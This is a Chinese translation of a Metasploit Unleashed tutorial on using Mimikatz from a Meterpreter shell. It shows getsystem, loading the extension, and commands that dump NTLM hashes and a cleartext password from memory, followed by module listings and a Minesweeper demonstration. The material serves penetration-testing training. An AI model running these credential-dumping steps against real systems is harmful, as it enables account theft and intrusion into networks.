# Mimikatz ON Metasploit

from：http://www.offensive-security.com/metasploit-unleashed/Mimikatz

0x00 背景
-------

* * *

看了各种文章讲神器mimikatz，但是一直没有讲与metasploit使用的。Metasploit其实早就集成了mimikatz，现在将官方的文章翻译给大家。

Mimikatz是Benjamin Delpy (gentilkiwi)写的非常棒的一款后渗透测试工具。在最初渗透阶段之后的大多数时间里，攻击者们可能是想在计算机/网络中得到一个更坚固的立足点。这样做通常需要一组补充的工具。Mimikatz是一种将攻击者想执行的、最有用的任务捆绑在一起的尝试。

幸运地，metasploit已经决定将其作为一个meterpreter脚本来集成mimikatz，允许方便地访问它一系列的特性，而不需要上传任何文件到被盗用主机的磁盘上。

Note:在metasploit中mimikatz的版本是v1.0，然而Benjamin Delpy早已经在他的网站上作为一个独立的包发布了v2.0。这是有必要提出的，因为很多的语法与升级到v2.0已经改变了。

0x01 Loading Mimikatz
---------------------

* * *

在得到一个meterpreter shell后，我们应该确保我们的session是运行在system权限以便让mimikatz正常工作。

```
meterpreter > getuid 
Server username: WINXP-E95CE571A1\Administrator 
meterpreter > getsystem
 ...got system (via technique 1). 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

```

Mimikatz支持32位和64位的windows架构。在升级权限到system后，我们需要通过“sysinfo”命令来确认目标机器的架构。这对于64位机器是有必要的，因为我们可能会破坏一个32位的进程在64位的架构上。如果这样的话，meterpreter将会尝试加载32位版本的mimikatz到内存，将可能会使得大部分的特性不可用。这可以通过查看正在运行的进程列表以及在加载mimikatz之前迁移到64位进程来避免。

```
meterpreter > sysinfo 
Computer : WINXP-E95CE571A1 
OS : Windows XP (Build 2600, Service Pack 3). 
Architecture : x86 
System Language : en_US 
Meterpreter : x86/win32

```

既然这是一个32位机器，我们可以加载mimikatz模块进内存：

```
meterpreter > load mimikatz 
Loading extension mimikatz...success. 
meterpreter > help mimikatz

# Mimikatz Commands

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom commannd
    msv               Attempt to retrieve msv creds (hashes)
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds

```

Metasploit提供给我们一些内建的命令来查看mimikatz的最常用的功能：从内存中导出hash以及明文证书。Mimikatz_command选项可以让我们使用mimikatz的全部特性。

```
meterpreter > mimikatz_command -f version 
mimikatz 1.0 x86 (RC) (Nov 7 2013 08:21:02)

```

尽管有些不同寻常，我们仍然可以通过尝试加载一个不存在的特性来得到可用模块的完整列表：

```
meterpreter > mimikatz_command -f fu::
Module : 'fu' introuvable

Modules disponibles : 
                - Standard
      crypto    - Cryptographie et certificats
        hash    - Hash
      system    - Gestion système
     process    - Manipulation des processus
      thread    - Manipulation des threads
     service    - Manipulation des services
   privilege    - Manipulation des privilèges
      handle    - Manipulation des handles
 impersonate    - Manipulation tokens d'accès
     winmine    - Manipulation du démineur
 minesweeper    - Manipulation du démineur 7
       nogpo    - Anti-gpo et patchs divers
     samdump    - Dump de SAM
      inject    - Injecteur de librairies
          ts    - Terminal Server
      divers    - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
    sekurlsa    - Dump des sessions courantes par providers LSASS
         efs    - Manipulations EFS

```

我们可以使用如下的语法来请求某个模块可用的选项：

```
meterpreter > mimikatz_command -f divers::
Module : 'divers' identifié, mais commande '' introuvable

Description du module : Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
  noroutemon    - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage
   eventdrop    - [super experimental] Patch l'observateur d'événements pour ne plus rien enregistrer
  cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session
     secrets    - Affiche les secrets utilisateur

```

0x02 从内存中读取hash和密码
------------------

* * *

我们既可以使用metasploit内建的命令也可以使用mimikatz自带的命令来从目标机器上导出hash和明文证书。

**Built-In Metasploit**:**msv credentials**

```
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;78980  NTLM       WINXP-E95CE571A1  Administrator     lm{ 00000000000000000000000000000000 }, ntlm{ d6eec67681a3be111b5605849505628f }
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;56683  NTLM                                          n.s. (Credentials KO)
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  n.s. (Credentials KO)

```

**kerberos credentials**

```
meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     
0;56683  NTLM                                          
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   
0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword

```

**Native Mimikatz**:

```
meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : winxp-e95ce571a1
BootKey    : 553d8c1349162121e2a5d3d0f571db7f

Rid  : 500
User : Administrator
LM   : 
NTLM : d6eec67681a3be111b5605849505628f

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1000
User : HelpAssistant
LM   : 6165cd1a0ebc61e470475c82cd451e14
NTLM : 

Rid  : 1002
User : SUPPORT_388945a0
LM   : 
NTLM : 771ee1fce7225b28f8aec4a88aea9b6a

meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword }

```

<前面一句命令在密码超过14位时LM会为空，后一句命令可以得到明文>

0x03 其他的模块
----------

* * *

Mimikatz的一些其他模块包含了很多有用的特性，更完整的特性列表可以在Benjamin Delpy的博客 http://blog.gentilkiwi.com/上找到。下面是几个使用实例：

Handle模块可以用来list/kill进程以及模拟用户令牌：

```
meterpreter > mimikatz_command -f handle::
Module : 'handle' identifié, mais commande '' introuvable

Description du module : Manipulation des handles
        list    - Affiche les handles du système (pour le moment juste les processus et tokens)
 processStop    - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
tokenImpersonate        - Essaye d'impersonaliser un token en utilisant d'autres handles
     nullAcl    - Positionne une ACL null sur des Handles

meterpreter > mimikatz_command -f handle::list
...snip...
  760  lsass.exe                 ->  1004       Token           NT AUTHORITY\NETWORK SERVICE
  760  lsass.exe                 ->  1008       Process 704     winlogon.exe
  760  lsass.exe                 ->  1052       Process 980     svchost.exe
  760  lsass.exe                 ->  1072       Process 2664    fubar.exe
  760  lsass.exe                 ->  1084       Token           NT AUTHORITY\LOCAL SERVICE
  760  lsass.exe                 ->  1096       Process 704     winlogon.exe
  760  lsass.exe                 ->  1264       Process 1124    svchost.exe
  760  lsass.exe                 ->  1272       Token           NT AUTHORITY\ANONYMOUS LOGON
  760  lsass.exe                 ->  1276       Process 1804    psia.exe
  760  lsass.exe                 ->  1352       Process 480     jusched.exe
  760  lsass.exe                 ->  1360       Process 2056    TPAutoConnSvc.exe
  760  lsass.exe                 ->  1424       Token           WINXP-E95CE571A1\Administrator
...snip...

```

Service模块让你可以list/start/stop以及remove windows服务：

```
meterpreter > mimikatz_command -f service::
Module : 'service' identifié, mais commande '' introuvable

Description du module : Manipulation des services
        list    - Liste les services et pilotes
       start    - Démarre un service ou pilote
        stop    - Arrête un service ou pilote
      remove    - Supprime un service ou pilote
    mimikatz    - Installe et/ou démarre le pilote mimikatz

meterpreter > mimikatz_command -f service::list
...snip...
        WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device (RFCOMM Protocol TDI)
        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call (RPC) Locator
  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call (RPC)
        WIN32_OWN_PROCESS       STOPPED RSVP    QoS RSVP
  760   WIN32_SHARE_PROCESS     RUNNING SamSs   Security Accounts Manager
        WIN32_SHARE_PROCESS     STOPPED SCardSvr        Smart Card
 1124   WIN32_SHARE_PROCESS     RUNNING Schedule        Task Scheduler
        KERNEL_DRIVER   STOPPED Secdrv  Secdrv
 1124   INTERACTIVE_PROCESS     WIN32_SHARE_PROCESS     RUNNING seclogon        Secondary Logon
 1804   WIN32_OWN_PROCESS       RUNNING Secunia PSI Agent       Secunia PSI Agent
 3460   WIN32_OWN_PROCESS       RUNNING Secunia Update Agent    Secunia Update Agent
...snip...

```

Crypto模块允许你list、export任何证书，以及储存在目标机器上相应的私钥：

```
meterpreter > mimikatz_command -f crypto::
Module : 'crypto' identifié, mais commande '' introuvable

Description du module : Cryptographie et certificats
listProviders   - Liste les providers installés)
  listStores    - Liste les magasins système
listCertificates        - Liste les certificats
    listKeys    - Liste les conteneurs de clés
exportCertificates      - Exporte les certificats
  exportKeys    - Exporte les clés
    patchcng    - [experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
   patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable

meterpreter > mimikatz_command -f crypto::listProviders
Providers CryptoAPI :
        Gemplus GemSAFE Card CSP v1.0
        Infineon SICRYPT Base Smart Card CSP
        Microsoft Base Cryptographic Provider v1.0
        Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
        Microsoft Base DSS Cryptographic Provider
        Microsoft Base Smart Card Crypto Provider
        Microsoft DH SChannel Cryptographic Provider
        Microsoft Enhanced Cryptographic Provider v1.0
        Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
        Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
        Microsoft RSA SChannel Cryptographic Provider

```

0x04 Never Lose At Minesweeper Again!
-------------------------------------

* * *

Mimikatz也包含许多新奇的特性。最重要的一个就是能够在经典的windows扫描游戏中，直接从内存中读地雷的位置。

![enter image description here](http://drops.javaweb.org/uploads/images/7f966257aeeaf78b83359233abebd4ce2fc574e7.jpg)

```
meterpreter > mimikatz_command -f winmine::infos
Mines           : 99
Dimension       : 16 lignes x 30 colonnes
Champ           : 

         . . . . . . * . * 1   1 * 1           1 * . . . . . . * . *
         . . * . . . . . . 1   1 1 1       1 1 2 . * . * * . * * . .
         . * . . . . . * . 1         1 1 1 1 * . . . * . . * . . . .
         . . . . . * . * * 2 1     1 2 * . . . * * . . * . . . . * .
         . . * . . * . . . * 1     1 * . * . . . . . . . * . * . . .
         . * * . . . . . . . 2 1 1 1 . * . . . . * . . * . . . . . .
         . . . . . . . . . . . * . . . . . * . . . . . * * . . . . .
         . . . * . * . . . . . * . * . . . . * . . . . * . . . . . .
         . . . . . * * . * . * . * . * * . * * * . . . . . . . . * .
         * * . * . . . 3 1 2 1 2 1 . . * . . * . . * . . * . . . . .
         . . . . * * * 1         1 . . * * . . . * . . . . . . * . *
         . . * * * . 3 1     1 1 2 * 2 2 2 . * . . . . . . * . . . .
         . . . . . * 1   1 1 2 * . 1 1   1 . . . . * . * * * . . . .
         . . . . . . 1   1 * . . . 1     1 * . . . * . . . . . * . .
         . . . . . . 1 1 2 . . . * 1     1 1 1 1 * * . * . . . . * .
         . * . . . . . * . . . * . 1           1 . * . . . . . . . *

```